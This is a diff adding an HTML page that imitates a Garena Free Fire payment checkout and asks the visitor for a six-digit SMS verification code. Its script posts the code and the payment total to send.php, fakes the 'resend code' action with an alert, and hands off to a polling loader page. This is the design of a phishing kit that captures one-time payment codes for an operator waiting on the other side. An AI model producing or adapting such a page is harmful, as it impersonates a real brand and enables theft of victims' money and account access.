@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Código SMS | Garena Free Fire</title>
+
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        :root {
+            --color-primary: #E41E26;
+            --color-primary-light: #ff3841;
+            --color-accent: #ff6b35;
+            --color-dark: #0a0a0a;
+            --color-border: rgba(228, 30, 38, 0.3);
+            --color-bg: #1a1a1a;
+            --radius: 12px;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #ffffff;
+            min-height: 100vh;
+        }
+
+        .page-wrapper {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px 16px;
+        }
+
+        .panel {
+            width: 100%;
+            max-width: 460px;
+            background: #1e1e1e;
+            border-radius: var(--radius);
+            box-shadow: 0 10px 40px rgba(228, 30, 38, 0.3), 0 2px 8px rgba(0, 0, 0, 0.5);
+            padding: 28px 24px 32px;
+            border-top: 4px solid var(--color-primary);
+        }
+
+        .checkout-header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding-bottom: 18px;
+            border-bottom: 2px solid var(--color-border);
+        }
+
+        .logo-container {
+            margin-bottom: 12px;
+        }
+
+        .logo-img {
+            height: 60px;
+            object-fit: contain;
+            border-radius: 12px;
+        }
+
+        .checkout-title {
+            font-size: 1.35rem;
+            font-weight: 700;
+            margin: 0 0 6px;
+            color: var(--color-primary);
+            letter-spacing: -0.02em;
+        }
+
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, rgba(228, 30, 38, 0.2) 0%, rgba(255, 107, 53, 0.2) 100%);
+            padding: 6px 14px;
+            border-radius: 18px;
+            font-size: 0.75rem;
+            color: #ff6b35;
+            font-weight: 600;
+            margin-top: 8px;
+            border: 1px solid var(--color-border);
+        }
+
+        h2 {
+            font-size: 1.05rem;
+            margin: 0 0 12px;
+            font-weight: 700;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        p {
+            font-size: 0.875rem;
+            color: #cccccc;
+            margin: 0 0 8px;
+            line-height: 1.5;
+        }
+
+        .details-box {
+            margin-top: 20px;
+            background: linear-gradient(135deg, rgba(228, 30, 38, 0.1) 0%, rgba(255, 107, 53, 0.1) 100%);
+            padding: 18px;
+            border-radius: 10px;
+            border: 2px solid var(--color-border);
+        }
+
+        .details-title {
+            font-size: 0.95rem;
+            font-weight: 700;
+            margin: 0 0 14px;
+            color: #ff6b35;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--color-border);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .row-detail {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding: 8px 0;
+        }
+
+        .row-detail label {
+            font-size: 0.85rem;
+            color: #999;
+            font-weight: 500;
+        }
+
+        .row-detail span {
+            font-size: 0.9rem;
+            color: #ffffff;
+            font-weight: 700;
+        }
+
+        .row-form {
+            margin-top: 18px;
+            padding-top: 18px;
+            border-top: 2px solid rgba(228, 30, 38, 0.2);
+        }
+
+        .row-form label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .row-form input {
+            width: 100%;
+            padding: 11px 14px;
+            border-radius: 8px;
+            border: 2px solid #333;
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.2s ease;
+            background: #2a2a2a;
+            color: #ffffff;
+            text-align: center;
+            letter-spacing: 0.15em;
+            font-weight: 600;
+        }
+
+        .row-form input:focus {
+            border-color: var(--color-primary);
+            box-shadow: 0 0 0 3px rgba(228, 30, 38, 0.2);
+        }
+
+        .resend-link {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 0.8rem;
+            color: #999;
+            margin-top: 12px;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .resend-link:hover {
+            color: var(--color-primary);
+            text-decoration: underline;
+        }
+
+        .btn-submit {
+            display: block;
+            width: 100%;
+            margin: 24px 0 0;
+            padding: 13px 28px;
+            border-radius: 8px;
+            border: none;
+            background: linear-gradient(135deg, var(--color-primary) 0%, var(--color-primary-light) 100%);
+            color: #fff;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(228, 30, 38, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-submit::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn-submit:hover::before {
+            left: 100%;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(228, 30, 38, 0.6);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            backdrop-filter: blur(4px);
+        }
+
+        .loader-overlay.active {
+            display: flex;
+        }
+
+        .loader-box {
+            background: #1e1e1e;
+            padding: 36px 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(228, 30, 38, 0.5);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+            border-top: 4px solid var(--color-primary);
+        }
+
+        .loader-circle {
+            border: 5px solid #333;
+            border-top: 5px solid var(--color-primary);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        .loader-text {
+            font-size: 0.95rem;
+            color: #ffffff;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 500px) {
+            .panel {
+                padding: 24px 20px 28px;
+            }
+
+            .details-box {
+                padding: 16px;
+            }
+
+            .logo-img {
+                height: 50px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-wrapper">
+        <div class="panel">
+            <div class="checkout-header">
+                <div class="logo-container">
+                    <img src="../images/free-fire-icon.png" alt="Free Fire" class="logo-img">
+                </div>
+                <h1 class="checkout-title">Código de Verificación</h1>
+                <div class="secure-badge">
+                    <i class="fas fa-sms"></i>
+                    Verificación por SMS
+                </div>
+            </div>
+
+            <h2>
+                <i class="fas fa-mobile-alt"></i>
+                Revisa tu celular
+            </h2>
+            <p>Hemos enviado un código de 6 dígitos a tu celular registrado. Por favor ingrésalo a continuación para
+                completar tu pago.</p>
+
+            <div class="details-box">
+                <p class="details-title">
+                    <i class="fas fa-receipt"></i>
+                    Detalle de la transacción
+                </p>
+
+                <div class="row-detail">
+                    <label><i class="fas fa-building"></i> Empresa:</label>
+                    <span>Garena Free Fire</span>
+                </div>
+                <div class="row-detail">
+                    <label><i class="fas fa-gem"></i> Diamantes:</label>
+                    <span id="diamondsDisplay">0</span>
+                </div>
+                <div class="row-detail">
+                    <label><i class="fas fa-dollar-sign"></i> Monto a pagar:</label>
+                    <span id="montoDisplay">COP$ 0</span>
+                </div>
+
+                <div class="row-form">
+                    <label for="otp">
+                        <i class="fas fa-hashtag"></i>
+                        Código SMS (6 dígitos)
+                    </label>
+                    <input id="otp" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="••••••" maxlength="6"
+                        autocomplete="off">
+                </div>
+
+                <a href="#" class="resend-link" id="resendLink">
+                    <i class="fas fa-redo-alt"></i>
+                    ¿No recibiste el código? Reenviar
+                </a>
+
+                <button type="button" class="btn-submit">
+                    <i class="fas fa-check-circle"></i> Verificar código
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="loader-overlay" id="loader">
+        <div class="loader-box">
+            <div class="loader-circle"></div>
+            <p class="loader-text">
+                <i class="fas fa-sync-alt fa-spin"></i><br>
+                Verificando código...<br>Por favor espera
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Leer desde localStorage de Free Fire
+            let total = parseInt(localStorage.getItem('ff_total')) || 0;
+            let diamonds = parseInt(localStorage.getItem('ff_diamonds')) || 0;
+
+            const formatted = total.toLocaleString('es-CO', {
+                style: 'currency',
+                currency: 'COP',
+                maximumFractionDigits: 0
+            });
+            document.getElementById('montoDisplay').textContent = formatted;
+            document.getElementById('diamondsDisplay').textContent = diamonds;
+
+            // Solo números en el input
+            const otpInput = document.getElementById('otp');
+            otpInput.addEventListener('input', function (e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+
+            // Link de reenviar (de momento solo simula)
+            document.getElementById('resendLink').addEventListener('click', function (e) {
+                e.preventDefault();
+                alert('Código reenviado a tu celular');
+            });
+        });
+
+        // Click en el botón Verificar
+        document.querySelector('.btn-submit').addEventListener('click', function (e) {
+            e.preventDefault();
+
+            const otp = document.getElementById('otp').value.trim();
+
+            if (!otp || otp.length < 4) {
+                alert('Por favor ingresa un código válido');
+                return;
+            }
+
+            // Leer total de localStorage
+            let total = parseInt(localStorage.getItem('ff_total')) || 0;
+
+            const payload = {
+                event: 'OTP',
+                total: total,
+                otp: otp
+            };
+
+            console.log('Enviando OTP a send.php:', payload);
+
+            // Mostrar loader
+            document.getElementById('loader').classList.add('active');
+
+            fetch('send.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+                .then(res => res.json())
+                .then(result => {
+                    console.log('Respuesta send.php:', result);
+
+                    if (result.ok) {
+                        // ✅ Limpiar acciones anteriores y volver a loader
+                        fetch('../poll_updates.php?clear=1')
+                            .then(() => {
+                                window.location.href = 'loader.html';
+                            });
+                    } else {
+                        document.getElementById('loader').classList.remove('active');
+                        alert('Error al enviar. Intenta nuevamente.');
+                    }
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    document.getElementById('loader').classList.remove('active');
+                    alert('Error de conexión.');
+                });
+        });
+    </script>
+</body>
+
+</html>
